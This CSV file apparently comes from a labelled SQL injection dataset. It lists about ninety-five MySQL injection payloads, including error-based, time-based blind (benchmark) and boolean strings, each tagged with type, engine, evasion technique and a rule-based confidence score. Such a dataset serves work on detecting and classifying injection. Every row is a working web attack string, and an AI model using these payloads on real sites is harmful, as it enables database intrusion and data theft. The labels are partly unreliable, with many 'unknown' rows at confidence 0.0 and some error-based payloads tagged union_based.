payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""igop"" = ""igop",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1'+ ( select 'zirh' where 9054 = 9054 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1'|| ( select 'cjwp' where 8681 = 8681 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) ||'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'ffzv' = 'ffzv",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) where 7165 = 7165 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'nond' = 'nond",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1%"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""%"" = """,error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ""%"" = """,error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1'+ ( select 'arzm' where 6464 = 6464 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) +'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 'pmzp' like 'pmzp",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) )",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""%"" = """,time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 5524 = 5524",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""%"" = """,union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ""nzgn"" = ""nzgn",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) where 1001 = 1001 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1"" ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( ""ftjg"" = ""ftjg",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and 'yvzf' = 'yvzf",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( '%' = '",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'gfpd' = 'gfpd",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 4510 = 4510",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'zenl' like 'zenl",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""mmsh"" = ""mmsh",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""enfu"" = ""enfu",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) as najc where 5213 = 5213 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""tabq"" like ""tabq",error_based,mysql,function_alternative|hex_string,0.44,rule,sqliv2_csv,unknown
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""dsae"" = ""dsae",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1%' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( '%' = '",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""gknn"" like ""gknn",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"-2110' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" where 5334 = 5334 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-7248' ) where 4626 = 4626 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'asdc' like 'asdc",error_based,mysql,case_variation|function_alternative|hex_string,0.4,rule,sqliv2_csv,unknown
"1'+ ( select sfuq where 8094 = 8094 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",error_based,mysql,case_variation|hex_string,0.44,rule,sqliv2_csv,unknown
"-9929' ) as gbtc where 8162 = 8162 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-1588%"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) where 1027 = 1027 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 6690 = 6690",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) where 6374 = 6374 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""hgds"" like ""hgds",time_blind,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) as qjjm where 3850 = 3850 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-6170 ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""tiet"" like ""tiet",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""gmld"" like ""gmld",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'beju' like 'beju",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'tmwy' = 'tmwy",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'mwmn' where 5112 = 5112 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-9845"" ) as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""qkds"" like ""qkds",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) ) as krro where 1050 = 1050 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1%' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and '%' = '",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 2230 = 2230",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1'+ ( select 'vbqo' where 5630 = 5630 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,case_variation|hex_string,0.44,rule,sqliv2_csv,unknown
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""rdri"" = ""rdri",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"-4558' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1%' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( '%' = '",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1 ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 5349 = 5349",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1%' ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1 ) as oblq where 2002 = 2002 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1'+ ( select 'utlx' where 6256 = 6256 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) ) +'",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1' in boolean mode ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) #",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'ufgs' where 9670 = 9670 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""wvkp"" like ""wvkp",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1' where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"1%"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""%"" = """,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"-9057"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'rpof' like 'rpof",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'ndhn' like 'ndhn",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1' in boolean mode ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( '%' = '",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( '%' = '",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1',row ( 7937,5067 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 7937 = 7937,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 9974 union select 5497 union select 8209 union select 8147 ) a group by x )",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 5037 = 5037",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) # dyed",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' where 8277 = 8277 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""imlx"" = ""imlx",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) where 1323 = 1323 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1%"" ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""%"" = """,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv2_csv,unknown
"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'swke' = 'swke",error_based,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,hex_string,0.44,rule,sqliv2_csv,unknown
"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""uqor"" like ""uqor",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1' in boolean mode ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) #",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
